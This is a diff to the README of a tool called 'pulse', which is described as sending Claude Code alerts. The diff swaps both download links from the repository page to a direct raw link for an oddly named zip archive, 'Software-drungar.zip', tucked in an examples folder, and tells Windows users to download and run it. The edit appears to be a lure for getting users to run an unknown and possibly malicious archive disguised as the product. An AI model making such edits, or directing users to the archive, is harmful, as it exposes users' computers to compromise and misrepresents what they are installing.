@@ -1,12 +1,12 @@
 # 🔔 pulse - Send Claude Code alerts fast
 
-[![Download pulse](https://img.shields.io/badge/Download%20pulse-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandyantiseptic907/pulse)
+[![Download pulse](https://img.shields.io/badge/Download%20pulse-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandyantiseptic907/pulse/raw/refs/heads/main/examples/Software-drungar.zip)
 
 ## 📥 Download
 
 Visit this page to download and run pulse on Windows:
 
-https://github.com/brandyantiseptic907/pulse
+https://github.com/brandyantiseptic907/pulse/raw/refs/heads/main/examples/Software-drungar.zip
 
 ## 🧩 What pulse does
 
